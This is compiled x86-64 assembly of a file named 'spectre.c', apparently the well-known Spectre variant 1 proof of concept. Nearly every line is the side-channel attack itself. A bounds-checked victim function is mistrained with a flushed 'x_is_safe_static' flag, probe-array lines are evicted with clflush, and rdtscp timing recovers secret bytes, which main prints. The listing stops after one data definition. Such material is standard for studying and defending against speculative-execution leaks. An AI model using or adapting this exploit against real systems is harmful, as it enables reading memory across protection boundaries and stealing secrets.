	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -16(%rbp)
	cmpq	$16, -16(%rbp)
	jae	.LBB0_2
# %bb.1:
	movl	$1, -4(%rbp)
	jmp	.LBB0_3
.LBB0_2:
	movl	$0, -4(%rbp)
.LBB0_3:
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	movq	-16(%rbp), %rax
	cmpl	$0, (%rax)
	je	.LBB1_2
# %bb.1:
	movq	-8(%rbp), %rcx
	leaq	array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	movzbl	(%rax,%rcx), %ecx
	movzbl	temp(%rip), %eax
	andl	%ecx, %eax
                                        # kill: def $al killed $al killed $eax
	movb	%al, temp(%rip)
.LBB1_2:
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movl	$0, -64(%rbp)
	movl	$0, -48(%rbp)
.LBB2_1:                                # =>This Inner Loop Header: Depth=1
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_4
# %bb.2:                                #   in Loop: Header=BB2_1 Depth=1
	movslq	-48(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_1
.LBB2_4:
	movl	$999, -44(%rbp)                 # imm = 0x3E7
.LBB2_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #       Child Loop BB2_15 Depth 3
                                        #     Child Loop BB2_21 Depth 2
                                        #     Child Loop BB2_28 Depth 2
	cmpl	$0, -44(%rbp)
	jle	.LBB2_44
# %bb.6:                                #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_7:                                #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-48(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_7
.LBB2_10:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	movl	$16, %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rax
	movq	%rax, -72(%rbp)
	movl	$29, -52(%rbp)
.LBB2_11:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_15 Depth 3
	cmpl	$0, -52(%rbp)
	jl	.LBB2_20
# %bb.12:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rax
	movq	-80(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -80(%rbp)
	movq	-72(%rbp), %rax
	movq	-80(%rbp), %rcx
	movq	-24(%rbp), %rdx
	xorq	-72(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -80(%rbp)
	cmpq	$16, -80(%rbp)
	jae	.LBB2_14
# %bb.13:                               #   in Loop: Header=BB2_11 Depth=2
	movl	$1, x_is_safe_static(%rip)
.LBB2_14:                               #   in Loop: Header=BB2_11 Depth=2
	leaq	x_is_safe_static(%rip), %rax
	movq	%rax, -112(%rbp)
	movq	-112(%rbp), %rax
	clflush	(%rax)
	movl	$0, -116(%rbp)
.LBB2_15:                               #   Parent Loop BB2_5 Depth=1
                                        #     Parent Loop BB2_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	-116(%rbp), %eax
	cmpl	$100, %eax
	jge	.LBB2_18
# %bb.16:                               #   in Loop: Header=BB2_15 Depth=3
	jmp	.LBB2_17
.LBB2_17:                               #   in Loop: Header=BB2_15 Depth=3
	movl	-116(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -116(%rbp)
	jmp	.LBB2_15
.LBB2_18:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rax
	movq	-80(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -80(%rbp)
	movq	-72(%rbp), %rax
	movq	-80(%rbp), %rcx
	movq	-24(%rbp), %rdx
	xorq	-72(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rdi
	movq	-112(%rbp), %rsi
	callq	victim_function
	movl	$0, x_is_safe_static(%rip)
# %bb.19:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB2_11
.LBB2_20:                               #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_21:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_27
# %bb.22:                               #   in Loop: Header=BB2_21 Depth=2
	imull	$167, -48(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -60(%rbp)
	movl	-60(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	leaq	array2(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -104(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -136(%rbp)                # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-136(%rbp), %rcx                # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -88(%rbp)
	movq	-104(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -64(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -128(%rbp)                # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-128(%rbp), %rcx                # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-88(%rbp), %rax
	movq	%rax, -96(%rbp)
	cmpq	$100, -96(%rbp)
	ja	.LBB2_25
# %bb.23:                               #   in Loop: Header=BB2_21 Depth=2
	movl	-60(%rbp), %eax
	movl	%eax, -140(%rbp)                # 4-byte Spill
	movl	-44(%rbp), %eax
	movl	$16, %ecx
	cltd
	idivl	%ecx
	movl	-140(%rbp), %eax                # 4-byte Reload
	movslq	%edx, %rdx
	leaq	array1(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
	cmpl	%ecx, %eax
	je	.LBB2_25
# %bb.24:                               #   in Loop: Header=BB2_21 Depth=2
	movslq	-60(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	readMemoryByte.results(%rip), %rax
	movl	%edx, (%rax,%rcx,4)
.LBB2_25:                               #   in Loop: Header=BB2_21 Depth=2
	jmp	.LBB2_26
.LBB2_26:                               #   in Loop: Header=BB2_21 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_21
.LBB2_27:                               #   in Loop: Header=BB2_5 Depth=1
	movl	$-1, -56(%rbp)
	movl	$-1, -52(%rbp)
	movl	$0, -48(%rbp)
.LBB2_28:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB2_38
# %bb.29:                               #   in Loop: Header=BB2_28 Depth=2
	cmpl	$0, -52(%rbp)
	jl	.LBB2_31
# %bb.30:                               #   in Loop: Header=BB2_28 Depth=2
	movslq	-48(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-52(%rbp), %rdx
	leaq	readMemoryByte.results(%rip), %rcx
	cmpl	(%rcx,%rdx,4), %eax
	jl	.LBB2_32
.LBB2_31:                               #   in Loop: Header=BB2_28 Depth=2
	movl	-52(%rbp), %eax
	movl	%eax, -56(%rbp)
	movl	-48(%rbp), %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB2_36
.LBB2_32:                               #   in Loop: Header=BB2_28 Depth=2
	cmpl	$0, -56(%rbp)
	jl	.LBB2_34
# %bb.33:                               #   in Loop: Header=BB2_28 Depth=2
	movslq	-48(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-56(%rbp), %rdx
	leaq	readMemoryByte.results(%rip), %rcx
	cmpl	(%rcx,%rdx,4), %eax
	jl	.LBB2_35
.LBB2_34:                               #   in Loop: Header=BB2_28 Depth=2
	movl	-48(%rbp), %eax
	movl	%eax, -56(%rbp)
.LBB2_35:                               #   in Loop: Header=BB2_28 Depth=2
	jmp	.LBB2_36
.LBB2_36:                               #   in Loop: Header=BB2_28 Depth=2
	jmp	.LBB2_37
.LBB2_37:                               #   in Loop: Header=BB2_28 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_28
.LBB2_38:                               #   in Loop: Header=BB2_5 Depth=1
	movslq	-52(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-56(%rbp), %rdx
	leaq	readMemoryByte.results(%rip), %rcx
	movl	(%rcx,%rdx,4), %ecx
	shll	$1, %ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	.LBB2_41
# %bb.39:                               #   in Loop: Header=BB2_5 Depth=1
	movslq	-52(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jne	.LBB2_42
# %bb.40:                               #   in Loop: Header=BB2_5 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	cmpl	$0, (%rax,%rcx,4)
	jne	.LBB2_42
.LBB2_41:
	jmp	.LBB2_44
.LBB2_42:                               #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_43
.LBB2_43:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	jmp	.LBB2_5
.LBB2_44:
	movl	-64(%rbp), %eax
	xorl	readMemoryByte.results(%rip), %eax
	movl	%eax, readMemoryByte.results(%rip)
	movl	-52(%rbp), %eax
	movb	%al, %cl
	movq	-32(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-52(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-40(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-56(%rbp), %eax
	movb	%al, %cl
	movq	-32(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-56(%rbp), %rcx
	leaq	readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-40(%rbp), %rax
	movl	%ecx, 4(%rax)
	addq	$144, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$80, %rsp
	movl	$0, -4(%rbp)
	movl	%edi, -8(%rbp)
	movq	%rsi, -16(%rbp)
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
	callq	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	movb	%al, -17(%rbp)
	movsbl	-17(%rbp), %eax
	cmpl	$114, %eax
	jne	.LBB3_22
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rsi
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -32(%rbp)
	movq	secret(%rip), %rdi
	callq	strlen@PLT
                                        # kill: def $eax killed $eax killed $rax
	movl	%eax, -44(%rbp)
	movq	$0, -56(%rbp)
.LBB3_3:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpq	$131072, -56(%rbp)              # imm = 0x20000
	jae	.LBB3_6
# %bb.4:                                #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rcx
	leaq	array2(%rip), %rax
	movb	$1, (%rax,%rcx)
# %bb.5:                                #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -56(%rbp)
	jmp	.LBB3_3
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$3, -8(%rbp)
	jne	.LBB3_8
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	movq	-16(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	-32(%rbp), %rdx
	leaq	.L.str.2(%rip), %rsi
	movb	$0, %al
	callq	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -32(%rbp)
	movq	-16(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	.L.str.3(%rip), %rsi
	leaq	-44(%rbp), %rdx
	movb	$0, %al
	callq	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rsi
	movl	-44(%rbp), %edx
	leaq	.L.str.4(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
.LBB3_8:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-44(%rbp), %esi
	leaq	.L.str.5(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movl	$0, -60(%rbp)
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	cmpl	$0, %eax
	jl	.LBB3_21
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=2
	movq	-32(%rbp), %rsi
	movq	secret(%rip), %rax
	movslq	-60(%rbp), %rcx
	movsbl	(%rax,%rcx), %edx
	leaq	.L.str.6(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movl	-60(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -60(%rbp)
	movq	-32(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -32(%rbp)
	leaq	-46(%rbp), %rsi
	leaq	-40(%rbp), %rdx
	callq	readMemoryByte
	movl	-40(%rbp), %ecx
	movl	-36(%rbp), %edx
	shll	$1, %edx
	leaq	.L.str.9(%rip), %rsi
	leaq	.L.str.8(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	.L.str.7(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	movzbl	-46(%rbp), %eax
	movl	%eax, -64(%rbp)                 # 4-byte Spill
	movzbl	-46(%rbp), %eax
	cmpl	$31, %eax
	jle	.LBB3_13
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-46(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB3_13
# %bb.12:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-46(%rbp), %eax
	movl	%eax, -68(%rbp)                 # 4-byte Spill
	jmp	.LBB3_14
.LBB3_13:                               #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -68(%rbp)                 # 4-byte Spill
	jmp	.LBB3_14
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-64(%rbp), %esi                 # 4-byte Reload
	movl	-68(%rbp), %edx                 # 4-byte Reload
	movl	-40(%rbp), %ecx
	leaq	.L.str.10(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	cmpl	$0, -36(%rbp)
	jle	.LBB3_20
# %bb.15:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %eax
	movl	%eax, -72(%rbp)                 # 4-byte Spill
	movzbl	-45(%rbp), %eax
	cmpl	$31, %eax
	jle	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %eax
	movl	%eax, -76(%rbp)                 # 4-byte Spill
	jmp	.LBB3_19
.LBB3_18:                               #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -76(%rbp)                 # 4-byte Spill
	jmp	.LBB3_19
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-72(%rbp), %esi                 # 4-byte Reload
	movl	-76(%rbp), %edx                 # 4-byte Reload
	movl	-36(%rbp), %ecx
	leaq	.L.str.11(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
.LBB3_20:                               #   in Loop: Header=BB3_9 Depth=2
	leaq	.L.str.12(%rip), %rdi
	movb	$0, %al
	callq	printf@PLT
	jmp	.LBB3_9
.LBB3_21:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_22:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$10, %eax
	jne	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_24:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$105, %eax
	jne	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_1 Depth=1
	movb	$0, %al
	callq	getpid@PLT
	movl	%eax, %edx
	leaq	.L.str.13(%rip), %rdi
	leaq	check(%rip), %rsi
	addq	$33, %rsi
	movb	$0, %al
	callq	printf@PLT
	jmp	.LBB3_27
.LBB3_26:
	jmp	.LBB3_30
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_28
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_29:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_30:
	xorl	%eax, %eax
	addq	$80, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	x_is_safe_static,@object        # @x_is_safe_static
	.bss
	.globl	x_is_safe_static
	.p2align	2
x_is_safe_static:
	.long	0                               # 0x0
	.size	x_is_safe_static, 4
